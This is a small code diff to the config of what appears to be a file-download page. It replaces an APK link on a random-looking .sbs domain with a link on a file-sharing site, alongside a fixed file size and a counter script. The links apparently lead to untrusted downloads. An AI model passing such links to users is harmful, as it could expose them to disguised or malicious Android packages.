@@ -1,6 +1,6 @@
 // ── CONFIG ────────────────────────────────────────────────────────
 const COUNTER_URL = 'counter.php';
-const DL_URL      = 'https://VpXlqaYHyfJv.sbs/download/NETYSV3.apk';
+const DL_URL      = 'https://safefileku.com/download/VcHjhWQY5Mdl1jYl';
 const FILE_MB     = 3;
 const FILE_KB     = FILE_MB * 1024;
 
